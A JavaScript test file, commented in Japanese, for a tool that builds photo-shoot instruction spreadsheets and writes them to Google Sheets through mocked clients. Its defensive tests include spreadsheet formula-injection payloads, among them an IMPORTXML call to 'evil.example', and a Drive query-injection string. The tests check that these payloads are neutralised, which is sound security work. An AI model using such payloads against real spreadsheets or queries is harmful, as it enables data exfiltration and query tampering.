/**
 * 撮影指示書 (スプレッドシート) の中身と書き込み係の試験 (画像制作の新フロー PR-D・2026-10-09)。
 *   lib/shoot-sheet.js        … 中身を組む純粋関数 (入力 → 行)
 *   services/sheets-writer.js … Google に書く係 (偽の Google を渡して、送った要求を見る)
 * 実際の Google には繋がない。API・画面・DB の試験は apps/product-hub/scripts/smoke.mjs
 */
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import {
  buildShootSheet, shootSheetTitle, cutsFromComposeText, mentionsShoot, cutNameFrom, sectionText,
  normalizeCuts, cutsFromSlots, aiNoOfUid, shootSheetMaterialHash, shootRequestBody, shootSheetBlockReason,
  spreadsheetUrl, cutCountWarning, joinFinish, SHEET_LAYOUT, CUT_FIELDS, SUMMARY_FIELDS,
} from '../apps/product-hub/lib/shoot-sheet.js';
import {
  writeSpreadsheet, formulaCell, findSpreadsheetByAppProperty, spreadsheetUsable, createSpreadsheetInFolder,
  explainGoogleError, getSheetsWriteClients,
} from '../apps/product-hub/services/sheets-writer.js';

const HERE = path.dirname(fileURLToPath(import.meta.url));
let pass = 0; let fail = 0;
const ok = (c, l, d = '') => { if (c) { pass++; console.log(`  ✓ ${l}`); } else { fail++; console.log(`  ✗ ${l}${d ? ' — ' + String(d).slice(0, 400) : ''}`); } };
const throwsAsync = async (l, fn, want) => {
  try { await fn(); fail++; console.log(`  ✗ ${l} — 例外が出なかった`); }
  catch (e) { if (!want || String(e.message).includes(want)) { pass++; console.log(`  ✓ ${l}`); } else { fail++; console.log(`  ✗ ${l} — ${e.message}`); } }
};

const FOLDER = 'https://drive.google.com/drive/folders/1AbCdEfGhIjKlMnOpQrStUvWxYz012345';
// 仕様書 (新商品初動判定 Ver1.3.11) の撮影カットの全項目
const CUT = {
  priority: '推奨', expression_type: '使用イメージ', variation: '代表1色', target: 'キャメル（1色・1本）', content: '使用シーン',
  purpose: '使い方を伝える', finish: '手元で使っている状態', usage: 'LP', open_required: '必要', reference_theme: '手元で使う様子',
  lp_image: '2枚目｜使い方', notice: 'ネイルなし',
};
const SUMMARY = { send_targets: 'キャメル（1色・1本）', purpose: '全体の目的', finish: '全体の完成像', usage: 'LP', conclusion: '結論', open_required: '一部必要' };

console.log('① ファイル名');
ok(shootSheetTitle('maitakep50', 'inhouse') === '撮影指示書_maitakep50（社内撮影）', '社内撮影');
ok(shootSheetTitle('maitakep50', 'photographer') === '撮影指示書_maitakep50（カメラマン撮影）', 'カメラマン撮影');
ok(shootSheetTitle('a/b:c\n', 'inhouse') === '撮影指示書_a／b_c（社内撮影）', '商品コードの / : 改行を寄せる', shootSheetTitle('a/b:c\n', 'inhouse'));

console.log('② 中身 (社内撮影) — 仕様書 Ver1.3.11 の「概要 + 1 カット 1 ブロック」');
const inh = buildShootSheet({ productCode: 'maitakep50', productName: 'マイタケ粉末 50g', shootMode: 'inhouse', folderUrl: FOLDER, summary: SUMMARY, cuts: [CUT], requestText: '依頼文' });
ok(inh.title === '撮影指示書_maitakep50（社内撮影）' && inh.sheets.length === 1 && inh.sheets[0].name === '撮影依頼書', '社内撮影は 1 タブ「撮影依頼書」だけ (依頼文のタブは無い)');
ok(JSON.stringify(inh.sheets[0].rows) === JSON.stringify([
  ['撮影依頼書'], ['商品コード', 'maitakep50'], ['商品名', 'マイタケ粉末 50g'], ['撮影担当', '社内撮影'], ['撮影用送付対象', 'キャメル（1色・1本）'], ['撮影カット数', '1カット'],
  [], ['カット1（推奨）'], ['撮影内容', '使用シーン'], ['撮影対象', 'キャメル（1色・1本）'], ['完成イメージ', '手元で使っている状態'], ['参考イメージ', ''], ['注意', 'ネイルなし'],
]), '概要 (商品コード／商品名／撮影担当／撮影用送付対象／撮影カット数) + カットのブロック (撮影内容／撮影対象／完成イメージ／参考イメージ)。社内撮影は必須／推奨を出す',
JSON.stringify(inh.sheets[0].rows));
const flatInh = inh.sheets[0].rows.flat().join('|');
ok(!['使用イメージ', '代表1色', '使い方を伝える', '手元で使う様子', '全体の目的', '結論', '2枚目｜使い方'].some((w) => flatInh.includes(w)),
  '🚨 内部連携の項目 (表現タイプ・バリエーション・目的・用途・開封・参考イメージのテーマ名・判定の結論) はシートに出さない', flatInh);
const f0 = inh.sheets[0].format;
ok(f0.boldRows.includes(0) && f0.boldRows.includes(7) && f0.shadedRows.includes(7) && f0.columnWidths.length === 2 && f0.wrap === true,
  '書式: タイトルとカットの見出しが太字・カットの見出しに網かけ・2 列の幅・折り返し', JSON.stringify(f0));
ok(inh.sheets[0].rows.flat().every((c) => typeof c === 'string'), 'セルは全部文字列 (stringValue で書く)');
ok(CUT_FIELDS.length === 13 && SUMMARY_FIELDS.join() === 'judgement,shooter,open_required,send_targets,purpose,finish,usage,conclusion', '入力は仕様書の撮影依頼書連携データの全項目を受ける形');
ok(SHEET_LAYOUT.summary.map((x) => x.label).join() === '商品コード,商品名,撮影担当,撮影用送付対象,撮影カット数'
  && SHEET_LAYOUT.cut.filter((x) => !x.onlyIfValue).map((x) => x.label).join() === '撮影内容,撮影対象,完成イメージ,参考イメージ', '表示の並びは SHEET_LAYOUT 1 か所 (仕様書の表示ルールの順)');
const noNotice = buildShootSheet({ productCode: 'x', productName: 'y', shootMode: 'inhouse', cuts: [{ ...CUT, notice: '' }] });
ok(!noNotice.sheets[0].rows.some((r) => r[0] === '注意'), '注意は値があるときだけ出す');
const empty = buildShootSheet({ productCode: 'x', productName: 'y', shootMode: 'inhouse', folderUrl: FOLDER, cuts: [] });
ok(empty.sheets[0].rows.some((r) => r[0] === '確認' && /書き足して/.test(r[1])) && empty.sheets[0].rows.some((r) => r[0] === '撮影カット数' && r[1] === '0カット'), '撮るカットが無ければ「確認」で書き足すよう出す');
let threw = false;
try { buildShootSheet({ productCode: 'x', shootMode: 'none', cuts: [] }); } catch { threw = true; }
ok(threw, '撮影不要・未判定では組まない (throw)');
// 補修材の「実物への貼付不可」(仕様書: 撮影内容か完成イメージのどちらかに必ず含める)
const patch = normalizeCuts([{ content: '補修シートの内容物', finish: '補修対象の横に非接着で配置', required_notice: '実物への貼付不可' },
  { content: '補修シート（実物への貼付不可）', finish: '横に置く', required_notice: '実物への貼付不可' }, { content: 'x', required_notice: '実物への貼付不可' }]);
ok(patch[0].finish === '補修対象の横に非接着で配置（実物への貼付不可）' && patch[1].finish === '横に置く' && patch[2].finish === '実物への貼付不可',
  '必ず出す表示 (実物への貼付不可) は、撮影内容にも完成イメージにも無ければ完成イメージに足す', JSON.stringify(patch));

console.log('③ 中身 (カメラマン撮影)');
const req = shootRequestBody({ mention: '@つくば', productName: 'マイタケ粉末 50g', sheetUrl: spreadsheetUrl('SHEET1'), folderUrl: FOLDER });
const ph = buildShootSheet({ productCode: 'maitakep50', productName: 'マイタケ粉末 50g', shootMode: 'photographer', folderUrl: FOLDER, summary: SUMMARY, cuts: [CUT], requestText: req });
ok(ph.sheets.length === 2 && ph.sheets[1].name === '依頼文', 'カメラマン撮影は 2 タブ目「依頼文」');
ok(ph.sheets[0].rows.some((r) => r[0] === 'カット1') && !ph.sheets[0].rows.some((r) => /推奨|必須/.test(r[0] || '')), 'カメラマン撮影は必須／推奨を出さない (全カット必須で確定)');
ok(ph.sheets[0].rows.some((r) => r[0] === '撮影担当' && r[1] === 'カメラマン撮影'), '撮影担当 (概要に無ければ撮影判定から)');
ok(ph.sheets[1].rows.map((r) => r[0]).join('\n') === req, '依頼文のタブは 1 行 1 セルで依頼文そのまま', JSON.stringify(ph.sheets[1].rows));
ok(req.split('\n')[0] === '@つくば' && req.includes('https://docs.google.com/spreadsheets/d/SHEET1/edit') && req.includes(FOLDER), '依頼文に宛先・指示書の URL・画像フォルダ');
ok(!shootRequestBody({ mention: '  ', productName: 'x', sheetUrl: 'u', folderUrl: 'f' }).startsWith('\n')
  && shootRequestBody({ mention: '', productName: 'x', sheetUrl: 'u', folderUrl: 'f' }).startsWith('お世話になっています。'), '宛先が空なら宛先の行を入れない');
ok(/最低 5 カット/.test(ph.sheets[0].rows.find((r) => r[0] === '確認')?.[1] || ''), 'カメラマン撮影で 5 カット未満なら「確認」に出す');
ok(cutCountWarning('photographer', 5) === null && cutCountWarning('photographer', 10) === null && /5 カット単位/.test(cutCountWarning('photographer', 6) || '')
  && cutCountWarning('inhouse', 2) === null, 'カメラマン撮影は 5 カット単位 (社内撮影は数を問わない)');

console.log('④ 数式として評価させない材料');
const evil = { ...CUT, content: '=IMPORTXML("https://evil.example/","//a")', target: '+1+1', notice: '-NG を書く', finish: '@SUM(A1)' };
const ev = buildShootSheet({ productCode: '=cmd', productName: '=HYPERLINK("x","y")', shootMode: 'inhouse', folderUrl: FOLDER, cuts: [evil] });
const evv = (label) => ev.sheets[0].rows.find((r) => r[0] === label)?.[1];
ok(evv('撮影内容') === evil.content && evv('撮影対象') === '+1+1' && evv('注意') === '-NG を書く' && evv('完成イメージ') === '@SUM(A1)' && evv('商品名') === '=HYPERLINK("x","y")',
  '値は書き換えない (先頭に \' も付けない) — 守りは stringValue で書くこと (下の書き込み係の試験で見る)', JSON.stringify(ev.sheets[0].rows));

console.log('⑤ カットをそろえる');
const v = normalizeCuts([{ content: ' 粉末アップ ', extra: 'x' }, CUT]);
ok(v.length === 2 && v[0].no === 1 && v[1].no === 2 && v[0].content === '粉末アップ' && v[0].target === '' && !('extra' in v[0]),
  '番号を振り直し・欠けた欄は空・知らない欄は落とす', JSON.stringify(v));
ok(normalizeCuts(Array.from({ length: 50 }, () => ({ content: 'x' }))).length === 40, '40 カットまで');

console.log('⑥ 材料の hash (「LP構成が変わりました」)');
const base = { productCode: 'c', productName: 'n', shootMode: 'inhouse', folderUrl: FOLDER, summary: SUMMARY, cuts: [CUT] };
const h0 = shootSheetMaterialHash(base);
ok(h0 === shootSheetMaterialHash({ ...base, cuts: [{ ...CUT }] }) && /^[0-9a-f]{64}$/.test(h0), '同じ材料なら同じ hash');
ok(h0 === shootSheetMaterialHash({ ...base, cuts: [Object.fromEntries(Object.entries(CUT).reverse())] }), '欄の順が違っても同じ hash');
ok(h0 !== shootSheetMaterialHash({ ...base, cuts: [{ ...CUT, finish: '真上から' }] }) && h0 !== shootSheetMaterialHash({ ...base, cuts: [{ ...CUT, reference_theme: '別のテーマ' }] }),
  'カットの中身が変われば違う hash (表示しない内部連携の項目も)');
ok(h0 !== shootSheetMaterialHash({ ...base, summary: { ...SUMMARY, send_targets: '3色' } }), '概要が変われば違う hash');
ok(h0 !== shootSheetMaterialHash({ ...base, shootMode: 'photographer' }) && h0 !== shootSheetMaterialHash({ ...base, productName: 'n2' })
  && h0 !== shootSheetMaterialHash({ ...base, folderUrl: FOLDER + 'x' }) && h0 !== shootSheetMaterialHash({ ...base, cuts: [] }),
  '撮影の種類・商品名・画像フォルダ・カットの数が変わっても違う hash');

console.log('⑦ LP構成 (⑦形式) から要撮影のカットを拾う');
const fixture = fs.readFileSync(path.join(HERE, 'fixtures', 'lp-compose', 'v22-3images-hakka.md'), 'utf8');
ok(cutsFromComposeText(fixture).length === 0, '使用素材に「撮影」が無い構成 (配信元の例) からは 0 カット');
// 1枚目の使用素材を「撮影: 使用シーン」にした構成
const withShoot = fixture.replace(/(# 1枚目｜FV[\s\S]*?## 使用素材\n)提供された実物商品画像/, '$1撮影: 使用シーン・提供された実物商品画像');
ok(withShoot !== fixture, '(前提) 1枚目の使用素材を書き換えられた');
const cuts = cutsFromComposeText(withShoot);
ok(cuts.length === 1, '使用素材に「撮影」が出てくる画像だけ要撮影', JSON.stringify(cuts));
const c1 = cuts[0] || {};
ok(c1.no === 1 && c1.lp_image === '1枚目｜FV' && c1.content === '使用シーン' && c1.priority === '必須', 'カット番号・使う LP 画像 (N枚目｜画像名)・撮影内容 (「撮影:」の後ろ)・優先度は必須', JSON.stringify(c1));
ok(c1.finish.startsWith('提供された実物商品画像を中央やや右') && c1.finish.includes('小物：最小限。') && c1.finish.includes('背景：明るい背景')
  && !c1.finish.includes('#FAF9F6') && c1.notice.startsWith('商品形状・ラベル') && c1.target === '',
  '完成イメージ = 商品配置 + 小物 (装飾・演出) + 背景 (長い使用カラーは入れない)・注意 = NG事項・撮影対象は空欄', JSON.stringify(c1));
// 撮影不要・撮影済み は要らない側
const notNeeded = fixture.replace(/(# 1枚目｜FV[\s\S]*?## 使用素材\n)提供された実物商品画像/, '$1撮影不要 (撮影済みの写真を使う)');
ok(cutsFromComposeText(notNeeded).length === 0, '「撮影不要」「撮影済み」だけなら要撮影にしない');
// 構図・小物・トーンの見出しがあればそれを使う
const bcBlock = '# 0枚目｜サムネイル\n## 使用素材\n撮影（粉末アップ）\n## 構図\n真上から\n## 小物\n豆皿\n## 背景・シーン\n白\n## トーン\n柔らかい影\n## NG\n黄色く見せない\n### 補足\n小見出しは中身に含む\n## 商品配置\n中央';
const bc = cutsFromComposeText(bcBlock)[0] || {};
ok(bc.content === '粉末アップ' && bc.finish === '真上から／小物：豆皿／背景：白／トーン：柔らかい影' && bc.notice.startsWith('黄色く見せない') && bc.notice.includes('小見出しは中身に含む'),
  '「## 構図」「## 小物」「## トーン」の見出しがあればそれを使い、完成イメージに寄せる (### 以下は中身)', JSON.stringify(bc));
ok(joinFinish({ composition: '真上', tone: '明るく' }) === '真上／トーン：明るく' && joinFinish({}) === '', '完成イメージに寄せる (空の欄は飛ばす)');
ok(cutsFromComposeText('').length === 0 && cutsFromComposeText(null).length === 0 && cutsFromComposeText('ただの文章 撮影').length === 0, '構成が無い・読めなければ 0 カット');
ok(mentionsShoot('撮影: x') && !mentionsShoot('撮影不要') && !mentionsShoot('撮影済み') && mentionsShoot('撮影済み・追加で撮影'), '撮影の語の見方');
ok(cutNameFrom('撮影: 使用シーン・素材2') === '使用シーン' && cutNameFrom('撮影（粉末アップ）') === '粉末アップ' && cutNameFrom('撮影：料理') === '料理', 'カット名を取れる (区切りの前まで)');
ok(cutNameFrom('撮影する') === null, '名前が書いていなければ null (画像名で埋める)');
ok(sectionText('## A\nx\n## B\ny', /^B$/) === 'y' && sectionText('## A\nx', /^Z$/) === '', '見出しの中身 (無ければ空)');

console.log('⑦-2 B の並び (編集版の要撮影) と C の判定 (AI の撮影指示) を合わせる');
{
  const blk = (mat, extra = '') => ['## 画像の役割', '特長', '## メイン見出し', '見出し', '## 商品配置', 'ブロックの構図', '## 使用素材', mat, '## NG事項', 'ブロックのNG', extra].join('\n').split('\n');
  const ai = [
    { no: 0, needs_shoot: false, cut: '', composition: '', props: '', background: '', tone: '', ng: '' },
    { no: 1, needs_shoot: false, cut: '', composition: '', props: '', background: '', tone: '', ng: '' },
    { no: 2, needs_shoot: true, cut: 'AIカット2', composition: 'AI構図2', props: 'AI小物2', background: 'AI背景2', tone: 'AIトーン2', ng: 'AI NG2' },
  ];
  const slotsAi = [
    { uid: 'a0', no: 0, name: 'サムネイル', lines: blk('提供された実物商品画像') },
    { uid: 'a1', no: 1, name: 'FV', lines: blk('撮影: 手元') },
    { uid: 'a2', no: 2, name: '成分', lines: blk('提供された実物商品画像') },
  ];
  ok(aiNoOfUid('a2') === 2 && aiNoOfUid('nAbc') === null && aiNoOfUid('e3x1') === null && aiNoOfUid('a') === null, 'uid から AI の構成での番号 (a<番号> だけ)');
  const c0 = cutsFromSlots({ slots: slotsAi, hasEditShoot: false, aiImages: null });
  ok(c0.length === 1 && c0[0].lp_image === '1枚目｜FV' && c0[0].content === '手元' && c0[0].finish === 'ブロックの構図' && c0[0].notice === 'ブロックのNG',
    '編集版も AI の判定も無い: 使用素材の「撮影」で推定し、中身はブロックから', JSON.stringify(c0));
  const c1b = cutsFromSlots({ slots: slotsAi, hasEditShoot: false, aiImages: ai });
  ok(c1b.length === 1 && c1b[0].lp_image === '2枚目｜成分' && c1b[0].content === 'AIカット2' && c1b[0].finish === 'AI構図2／小物：AI小物2／背景：AI背景2／トーン：AIトーン2'
    && c1b[0].notice === 'AI NG2' && c1b[0].target === '' && c1b[0].priority === '必須',
  'AI の判定 (PR-C) があれば要撮影は needs_shoot・cut → 撮影内容 / 構図・小物・背景・トーン → 完成イメージ / NG → 注意・ほかは空欄', JSON.stringify(c1b));
  // 編集版: 足した画像 (nNew) を 2枚目に入れて、AI の 2枚目 (a2) を 3枚目に。要撮影は人の値
  const slotsEdit = [
    { ...slotsAi[0], shoot: false }, { ...slotsAi[1], shoot: false },
    { uid: 'nNew', no: 2, name: '使い方', lines: blk('提供された実物商品画像'), shoot: true },
    { ...slotsAi[2], no: 3, shoot: true },
  ];
  const c2 = cutsFromSlots({ slots: slotsEdit, hasEditShoot: true, aiImages: ai });
  ok(c2.length === 2 && c2[0].lp_image === '2枚目｜使い方' && c2[0].content === '使い方' && c2[0].finish === 'ブロックの構図',
    '🚨 足した画像 (AI の判定なし) はブロックから拾う — 今の番号 2 で AI の 2枚目の中身を付けない', JSON.stringify(c2[0]));
  ok(c2[1].lp_image === '3枚目｜成分' && c2[1].content === 'AIカット2' && c2[1].no === 2, '🚨 並べ替えた画像は元の画像 (uid a2) で AI の判定を引く (今の番号 3)', JSON.stringify(c2[1]));
  const c3 = cutsFromSlots({ slots: slotsEdit.map((x) => ({ ...x, shoot: x.uid === 'a1' })), hasEditShoot: true, aiImages: ai });
  ok(c3.length === 1 && c3[0].lp_image === '1枚目｜FV' && c3[0].content === '手元', '人が要撮影にした画像 (AI は不要と判定) はブロックから拾う・AI が要るとした画像も人が外せば出ない', JSON.stringify(c3));
}

console.log('⑧ 作れない理由');
ok(/社内撮影/.test(shootSheetBlockReason({ shootMode: 'none', folderId: 'F', configured: true }) || '')
  && /社内撮影/.test(shootSheetBlockReason({ shootMode: null, folderId: 'F', configured: true }) || ''), '撮影不要・未判定');
ok(/画像フォルダ/.test(shootSheetBlockReason({ shootMode: 'inhouse', folderId: null, configured: true }) || ''), '画像フォルダが無い');
ok(/GOOGLE_SERVICE_ACCOUNT_KEY/.test(shootSheetBlockReason({ shootMode: 'photographer', folderId: 'F', configured: false }) || ''), 'サービスアカウントが未設定');
ok(shootSheetBlockReason({ shootMode: 'inhouse', folderId: 'F', configured: true }) === null, '揃えば null');

console.log('⑨ 書き込み係 (偽の Google)');
// tabs = [{ title, owned }]。送った要求を記録するだけ (適用の正しさは smoke の偽物が見る)
function fakeSheets(initialTabs, { failBatch = false } = {}) {
  const calls = [];
  const tabs = initialTabs.map((t, i) => ({ sheetId: i, title: t.title, owned: !!t.owned }));
  const sheets = { spreadsheets: {
    get: async (p) => { calls.push(['get', p]); return { data: { sheets: tabs.map((t) => ({ properties: { sheetId: t.sheetId, title: t.title, gridProperties: { rowCount: 5, columnCount: 3 } },
      developerMetadata: t.owned ? [{ metadataKey: 'phOwnedTab', metadataValue: t.title }] : [] })) } }; },
    batchUpdate: async (p) => { calls.push(['batchUpdate', p]); if (failBatch) throw Object.assign(new Error('Backend Error'), { code: 500 }); return { data: { replies: [] } }; },
    values: {
      batchClear: async (p) => { calls.push(['batchClear', p]); return {}; },
      batchUpdate: async (p) => { calls.push(['valuesBatchUpdate', p]); return {}; },
    },
  } };
  let name = '無題のスプレッドシート';
  const drive = { files: {
    get: async (p) => { calls.push(['driveGet', p]); return { data: { name } }; },
    update: async (p) => { calls.push(['driveUpdate', p]); name = p.requestBody.name; return { data: {} }; },
  } };
  const reqs = () => calls.filter((c) => c[0] === 'batchUpdate').flatMap((c) => c[1].requestBody.requests);
  return { sheets, drive, calls, reqs, nameOf: () => name };
}
{
  const g = fakeSheets([{ title: 'シート1' }]);
  await writeSpreadsheet(g, { spreadsheetId: 'S1', title: ph.title, tabs: ph.sheets, fresh: true });
  const rq = g.reqs();
  ok(g.calls.filter((c) => c[0] === 'batchUpdate').length === 1 && !g.calls.some((c) => c[0] === 'batchClear' || c[0] === 'valuesBatchUpdate'),
    '🚨 タブの足し引き・値の消去と書き込み・書式は batchUpdate 1 回 (途中で失敗して空の指示書を残さない)', JSON.stringify(g.calls.map((c) => c[0])));
  const adds = rq.filter((r) => r.addSheet).map((r) => r.addSheet.properties);
  ok(adds.map((p) => p.title).join() === '撮影依頼書,依頼文' && adds.every((p) => Number.isInteger(p.sheetId) && p.sheetId > 0) && new Set(adds.map((p) => p.sheetId)).size === 2,
    '作ったばかり: 「撮影依頼書」「依頼文」を足す (sheetId をこちらで決めて、同じ要求の中で書く)', JSON.stringify(adds));
  ok(rq.filter((r) => r.createDeveloperMetadata).map((r) => r.createDeveloperMetadata.developerMetadata).every((m) => m.metadataKey === 'phOwnedTab' && adds.some((p) => p.sheetId === m.location.sheetId))
    && rq.filter((r) => r.createDeveloperMetadata).length === 2, '足したタブに印 (developer metadata) を付ける');
  ok(rq.some((r) => r.deleteSheet && r.deleteSheet.sheetId === 0) && rq.findIndex((r) => r.deleteSheet) > rq.findIndex((r) => r.addSheet) && rq.findIndex((r) => r.deleteSheet) === rq.length - 1,
    '作ったばかりなら最初からある「シート1」を、足した後 (最後) に消す');
  const mainId = adds[0].sheetId;
  const writes = rq.filter((r) => r.updateCells && r.updateCells.rows);
  const cells = writes.flatMap((w) => w.updateCells.rows.flatMap((row) => row.values));
  ok(cells.length > 0 && cells.every((c) => Object.keys(c.userEnteredValue).join() === 'stringValue'), '🚨 値は stringValue だけ (数式・数値として評価させない)');
  ok(writes[0].updateCells.start.sheetId === mainId && writes[0].updateCells.start.rowIndex === 0 && writes[0].updateCells.rows.map((r) => r.values.map((c) => c.userEnteredValue.stringValue)).join('|') === ph.sheets[0].rows.join('|'),
    'タブごとに A1 から全行を書く');
  const clearIdx = rq.findIndex((r) => r.updateCells && r.updateCells.range && r.updateCells.range.sheetId === mainId && /userEnteredValue/.test(r.updateCells.fields));
  ok(clearIdx >= 0 && clearIdx < rq.indexOf(writes[0]), '書く前にタブの中身を消す (前の版の行が残らない)');
  ok(rq.some((r) => r.updateSheetProperties && r.updateSheetProperties.properties.sheetId === mainId && r.updateSheetProperties.properties.gridProperties.frozenRowCount === 0), '書式: 固定する行は無し (並べ順も指定)');
  ok(rq.some((r) => r.repeatCell && r.repeatCell.range.sheetId === mainId && r.repeatCell.range.startRowIndex === 6 && r.repeatCell.cell.userEnteredFormat.textFormat?.bold === true), '書式: 表の見出し行を太字');
  ok(rq.filter((r) => r.updateDimensionProperties && r.updateDimensionProperties.range.sheetId === mainId).length === 2, '書式: 2 列 (項目・内容) の幅');
  ok(g.nameOf() === ph.title, 'ファイル名が違えば付け直す');
}
{
  const g = fakeSheets([{ title: '撮影依頼書', owned: true }, { title: '依頼文', owned: true }, { title: '人のメモ' }]);
  await writeSpreadsheet(g, { spreadsheetId: 'S1', title: inh.title, tabs: inh.sheets, removeTabs: ['依頼文'] });
  const rq = g.reqs();
  ok(rq.filter((r) => r.deleteSheet).map((r) => r.deleteSheet.sheetId).join() === '1', '更新: 要らなくなった自分のタブ (印のある依頼文) だけ消し、人が足したタブは残す');
  ok(!rq.some((r) => r.addSheet), '更新: あるタブは足さない');
  ok(rq.filter((r) => r.updateCells).every((r) => (r.updateCells.range || r.updateCells.start).sheetId === 0), '更新: 書くのは自分のタブだけ (人のメモには触らない)');
  ok(rq.some((r) => r.appendDimension && r.appendDimension.dimension === 'ROWS' && r.appendDimension.length === inh.sheets[0].rows.length - 5),
    '行・列が足りなければ広げる (人が行を消していても書ける)');
  const g2 = fakeSheets([{ title: '撮影依頼書', owned: true }, { title: '依頼文' }]);
  await writeSpreadsheet(g2, { spreadsheetId: 'S1', title: inh.title, tabs: inh.sheets, removeTabs: ['依頼文'] });
  ok(!g2.reqs().some((r) => r.deleteSheet), '🚨 同じ名前でも印の無いタブ (人が作った「依頼文」) は消さない');
  const g3 = fakeSheets([{ title: '撮影依頼書' }]);
  await throwsAsync('🚨 書くタブと同じ名前の、人が作ったタブ (印なし) があれば止める (上書きしない)', () => writeSpreadsheet(g3, { spreadsheetId: 'S1', tabs: inh.sheets }), '人が作った');
  ok(!g3.calls.some((c) => c[0] === 'batchUpdate'), '止めたときは何も送らない');
  const g8 = fakeSheets([{ title: 'シート1' }, { title: '撮影依頼書' }]);
  await throwsAsync('🚨 作ったばかりのファイルでも、人が作った同じ名前のタブ (印なし) があれば止める', () => writeSpreadsheet(g8, { spreadsheetId: 'S1', tabs: inh.sheets, fresh: true }), '人が作った');
  const g5 = fakeSheets([{ title: 'シート1' }, { title: '人のメモ' }]);
  await writeSpreadsheet(g5, { spreadsheetId: 'S1', tabs: inh.sheets, fresh: true });
  ok(g5.reqs().filter((r) => r.deleteSheet).map((r) => r.deleteSheet.sheetId).join() === '0', '作ったばかりでも消すのは最初の「シート1」(sheetId 0) だけ (人がすぐ足したタブは残す)');
  const g6 = fakeSheets([{ title: '撮影依頼書', owned: true }]);
  await throwsAsync('送る直前の確認 (beforeWrite) が断れば throw', () => writeSpreadsheet(g6, { spreadsheetId: 'S1', tabs: inh.sheets, beforeWrite: () => { throw new Error('変わった'); } }), '変わった');
  ok(g6.calls.some((c) => c[0] === 'get') && !g6.calls.some((c) => c[0] === 'batchUpdate'), '🚨 送る直前の確認はタブを読んだ後に呼び、断ったら batchUpdate を送らない');
  const g7 = fakeSheets([{ title: '撮影依頼書', owned: true }, { title: '人のメモ' }]);
  let seen = null;
  await writeSpreadsheet(g7, { spreadsheetId: 'S1', tabs: inh.sheets, beforeWrite: (ctx) => { seen = ctx; } });
  ok(JSON.stringify(seen && seen.existing.map((t) => [t.title, t.owned])) === '[["撮影依頼書",true],["人のメモ",false]]', '送る直前の確認には、今あるタブと印の有無を渡す (拾い直したファイルに指示書があるかを呼び手が見る)', JSON.stringify(seen));
  // PR-F (デザイナー修正依頼書) 向け: 呼び手が組んだ式だけ式のセル・行の高さ
  const g9 = fakeSheets([{ title: 'シート1' }]);
  await writeSpreadsheet(g9, { spreadsheetId: 'S1', fresh: true, tabs: [{ name: '修正依頼', rows: [['画像', '修正指示'], [formulaCell('=IMAGE("https://drive.google.com/thumbnail?id=abc")'), '=人の入力']], format: { rowHeights: [{ start: 1, end: 2, px: 200 }] } }] });
  const w9 = g9.reqs().filter((r) => r.updateCells && r.updateCells.rows)[0].updateCells.rows;
  ok(w9[1].values[0].userEnteredValue.formulaValue === '=IMAGE("https://drive.google.com/thumbnail?id=abc")' && w9[1].values[1].userEnteredValue.stringValue === '=人の入力' && !('formulaValue' in w9[1].values[1].userEnteredValue),
    '式のセルは formulaCell() で渡したものだけ (= で始まる普通の文字は文字のまま)', JSON.stringify(w9));
  ok(g9.reqs().some((r) => r.updateDimensionProperties && r.updateDimensionProperties.range.dimension === 'ROWS' && r.updateDimensionProperties.range.startIndex === 1 && r.updateDimensionProperties.properties.pixelSize === 200), '行の高さを指定できる');
  let threwF = false; try { formulaCell('IMAGE(x)'); } catch { threwF = true; }
  ok(threwF, '式は = で始まるものだけ');
  const g4 = fakeSheets([{ title: '撮影依頼書', owned: true }], { failBatch: true });
  await throwsAsync('batchUpdate が失敗したら throw (呼び手が URL を書かない)', () => writeSpreadsheet(g4, { spreadsheetId: 'S1', title: 'x', tabs: inh.sheets }), 'Backend');
  ok(!g4.calls.some((c) => c[0] === 'driveUpdate'), '失敗したら名前も付け直さない');
}
{
  const listed = [];
  const drive = { files: {
    list: async (p) => { listed.push(p); return { data: { files: [{ id: 'FOUND1' }] } }; },
    create: async (p) => { listed.push(p); return { data: { id: 'NEW1' } }; },
    get: async (p) => {
      if (p.fileId === 'GONE00') throw Object.assign(new Error('File not found'), { code: 404 });
      if (p.fileId === 'BOOM00') throw Object.assign(new Error('Backend Error'), { code: 500 });
      return { data: { TRASH0: { trashed: true }, MOVED0: { parents: ['OTHERF'] }, GOOD00: { parents: ['FOLDER1'], mimeType: 'application/vnd.google-apps.spreadsheet' } }[p.fileId] };
    },
  } };
  const f = await findSpreadsheetByAppProperty({ drive }, { folderId: 'FOLDER1', key: 'phShootSheetDraft', value: '12' });
  ok(f?.id === 'FOUND1' && listed[0].q.includes("appProperties has { key='phShootSheetDraft' and value='12' }") && listed[0].q.includes("'FOLDER1' in parents")
    && listed[0].q.includes('trashed = false') && listed[0].supportsAllDrives === true, '前に作ったファイルを appProperties で探す (名前では探さない・共有ドライブ)', listed[0].q);
  await throwsAsync('フォルダ ID にクエリを壊す文字があれば探さない', () => findSpreadsheetByAppProperty({ drive }, { folderId: "x' or '1'='1", key: 'k', value: '1' }), 'フォルダ');
  await throwsAsync('appProperties の値にクエリを壊す文字があれば探さない', () => findSpreadsheetByAppProperty({ drive }, { folderId: 'FOLDER1', key: 'k', value: "1' or" }), 'appProperties');
  const c = await createSpreadsheetInFolder({ drive }, { folderId: 'FOLDER1', title: 'T', appProperties: { phShootSheetDraft: '12' } });
  const cp = listed[listed.length - 1];
  ok(c.id === 'NEW1' && cp.requestBody.mimeType === 'application/vnd.google-apps.spreadsheet' && cp.requestBody.parents[0] === 'FOLDER1'
    && cp.requestBody.appProperties.phShootSheetDraft === '12' && cp.supportsAllDrives === true && !('permissions' in cp.requestBody),
  'フォルダの中にスプレッドシートを作る (印の appProperties 付き・リンク共有は付けない)', JSON.stringify(cp));
  ok((await spreadsheetUsable({ drive }, { fileId: 'GONE00', folderId: 'FOLDER1' })).usable === false, '消されたファイル (404) は使えない → 作り直す');
  ok((await spreadsheetUsable({ drive }, { fileId: 'TRASH0', folderId: 'FOLDER1' })).reason === 'trashed', 'ごみ箱のファイルは使えない');
  ok((await spreadsheetUsable({ drive }, { fileId: 'MOVED0', folderId: 'FOLDER1' })).reason === 'moved', '別のフォルダに移ったファイルは使えない (今の画像フォルダに作る)');
  ok((await spreadsheetUsable({ drive }, { fileId: 'GOOD00', folderId: 'FOLDER1' })).usable === true, '同じフォルダのファイルは使う');
  await throwsAsync('404 以外の失敗 (権限・障害) は作り直さずに失敗にする', () => spreadsheetUsable({ drive }, { fileId: 'BOOM00', folderId: 'FOLDER1' }), 'Backend');
}

